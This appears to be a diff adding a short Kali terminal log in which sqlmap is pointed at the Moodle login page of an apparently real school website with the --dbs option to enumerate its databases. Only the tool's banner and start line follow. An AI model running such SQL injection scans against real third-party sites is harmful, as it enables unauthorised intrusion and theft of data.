@@ -1,0 +1,7 @@
+root@kali:~# sqlmap -u "http://insmontserratroig.com/moodle/login/index.php" --dbs
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: 
+[*] starting at 22:55:00
